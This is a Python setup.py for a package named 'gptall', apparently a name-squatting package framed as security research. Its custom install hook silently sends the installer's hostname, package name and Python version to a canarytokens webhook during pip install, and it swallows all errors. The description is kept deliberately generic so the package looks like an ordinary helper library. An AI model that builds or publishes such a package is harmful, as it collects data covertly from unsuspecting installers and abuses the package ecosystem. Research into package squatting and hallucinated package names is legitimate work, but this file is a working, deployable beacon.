from setuptools import setup, find_packages
from setuptools.command.install import install
import urllib.request
import socket
import sys

# ==============================================================================
# 🚨 CONFIGURATION: PASTE YOUR CANARY TOKEN HERE 🚨
# Go to canarytokens.org -> Select "HTTP / Web Bug" -> Paste URL below
# ==============================================================================
WEBHOOK_URL = "http://canarytokens.com/traffic/tags/static/jgarj5ki2uf0juz1wo1hcywko/index.html" 

# ==============================================================================
# 📦 PACKAGE NAME
# Change this to 'gptall' or 'threading-helper' depending on which one you upload
# ==============================================================================
PACKAGE_NAME = "gptall" 

class CustomInstall(install):
    def run(self):
        try:
            # 1. Gather Basic Info (To prove it wasn't you)
            hostname = socket.gethostname()
            py_ver = f"{sys.version_info.major}.{sys.version_info.minor}"
            
            # 2. Fire the Signal (Safe GET request)
            # We explicitly timeout fast so we don't slow down the user's build
            full_url = f"{WEBHOOK_URL}?host={hostname}&pkg={PACKAGE_NAME}&py={py_ver}"
            urllib.request.urlopen(full_url, timeout=2)
        except:
            pass # Fail silently. Never crash the user's computer.
            
        install.run(self)

setup(
    name=PACKAGE_NAME,
    version="0.0.1",
    description="Compatibility wrapper and helper utilities.", # Generic description
    author="Security Research",
    author_email="research@example.com",
    packages=find_packages(),
    cmdclass={'install': CustomInstall},
    classifiers=[
        "Programming Language :: Python :: 3",
        "Operating System :: OS Independent",
    ],
)
